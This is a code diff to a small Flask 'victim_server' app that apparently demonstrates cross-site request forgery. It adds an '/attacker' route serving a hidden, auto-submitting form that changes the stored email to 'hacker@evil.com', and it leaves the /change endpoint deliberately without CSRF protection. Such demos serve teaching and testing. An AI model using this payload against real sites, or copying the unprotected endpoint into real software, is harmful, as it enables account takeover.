@@ -1,5 +1,4 @@
-# victim_server.py (Flask)
-from flask import Flask, request, render_template_string, redirect, make_response
+from flask import Flask, request, redirect, render_template_string
 
 app = Flask(__name__)
 
@@ -16,12 +15,22 @@ def change_email():
         new_email = request.form.get('email')
         user_email = new_email
         return redirect('/')
-    return '''
-        <form method="POST" action="/change">
-            New Email: <input type="email" name="email" value="victim@example.com">
-            <input type="submit" value="Change">
+    return render_template_string("""
+        <form method='POST' action='/change'>
+            New Email: <input type='email' name='email' value='victim@example.com'>
+            <input type='submit' value='Change'>
         </form>
-    '''
+    """)
+
+@app.route('/attacker')
+def attacker():
+    return render_template_string("""
+        <form action='/change' method='POST' style='display: none;'>
+            <input type='hidden' name='email' value='hacker@evil.com'>
+            <input type='submit' value='Change Email'>
+        </form>
+        <script>document.forms[0].submit();</script>
+    """)
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
